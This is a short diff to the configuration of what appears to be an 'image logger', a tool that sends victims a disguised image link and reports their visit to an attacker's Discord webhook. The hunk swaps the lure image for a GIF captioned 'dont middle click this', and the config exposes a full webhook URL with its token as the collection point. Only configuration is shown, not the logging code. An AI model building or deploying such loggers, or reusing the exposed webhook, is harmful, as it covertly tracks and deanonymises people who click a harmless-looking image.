@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1441927395870507109/PK0xSBDY4nuZ5ESrL9qm2R00_156N2JwsZgf1ojDgxCblmQqExsWI0clNIu1hNgSFfnb",
-    "image": "https://facts.net/wp-content/uploads/2023/07/pufferfish-cute-.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.tenor.com/Bd-kl4M9wl0AAAAe/dont-middle-clikc-this-gif.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
